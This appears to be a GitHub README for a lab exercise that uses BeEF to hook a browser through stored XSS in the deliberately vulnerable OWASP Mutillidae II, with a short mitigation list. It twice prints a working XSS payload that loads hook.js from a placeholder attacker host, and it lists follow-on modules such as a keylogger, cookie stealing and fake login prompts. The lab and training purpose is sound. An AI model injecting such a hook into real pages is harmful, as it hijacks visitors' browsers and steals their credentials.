# 🔥 BeEF + Mutillidae XSS Demo

This project demonstrates how to use **BeEF** to hook a browser via a stored/reflected XSS vulnerability in **OWASP Mutillidae II**, and simulate client-side exploitation for educational and SOC analysis purposes.

> ⚠️ This is for **educational use only** in a legal lab environment.

---

## 🧪 Tools Used
- **Kali Linux** with BeEF (`beef-xss`)
- **OWASP Mutillidae II** vulnerable web app
- **Python HTTP Server** (to serve hook files or malicious pages)

---

## 🧷 Scenario

1. Launch BeEF (`sudo beef-xss`)
2. Navigate to Mutillidae > `XSS > Stored XSS`
3. Inject BeEF hook:
   ```html
   <script src="http://<KALI-IP>:3000/hook.js"></script>
   ```
4. Victim browses the vulnerable page → gets hooked by BeEF.
5. Attacker now executes modules (keylogger, port scanner, webcam test...).

---

## 📂 File Structure
- `attack_files/xss_mutillidae_payload.txt`: BeEF XSS injection example
- `report/incident_report.md`: SOC-style incident analysis
- `screenshots/`: Evidence of attack steps

---

## 📸 Screenshots

### 🎯 Hooked Victim  
![Hooked Victim](screenshots/hooked.png)

### 🧰 Mutillidae Home Page  
![Mutillidae Home Page](screenshots/commands.png)

----

## 📑 Sample Payload (`xss_mutillidae_payload.txt`)
```html
<script src="http://<KALI-IP>:3000/hook.js"></script>
```

> Injected into a form or URL parameter in Mutillidae

---

## 📖 Report Summary
- Target: Mutillidae (XSS > Stored)
- Hooked Victim Browser via malicious JavaScript
- Demonstrated:
  - Internal network scan
  - Cookie stealing simulation
  - Fake login prompt
- Analysis in `report/incident_report.md`

---

## 🛡️ Mitigation
- Content Security Policy (CSP)
- Input sanitization
- Disabling inline scripts

---

## 🧑‍💻 Author
Roei Ben Simon  
[GitHub » Roeibs100](https://github.com/Roeibs100)
